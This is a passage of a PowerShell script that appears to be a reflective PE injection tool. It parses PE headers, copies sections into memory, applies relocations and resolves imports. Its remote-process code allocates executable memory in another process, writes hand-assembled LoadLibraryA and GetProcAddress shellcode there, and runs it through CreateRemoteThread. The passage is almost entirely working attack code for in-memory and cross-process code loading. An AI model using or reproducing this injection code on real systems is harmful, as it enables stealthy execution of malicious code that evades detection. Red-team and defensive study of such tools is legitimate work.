        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    # PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        # Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            # in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            # SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            # so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                # Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {            
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }                

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    # If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    # and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
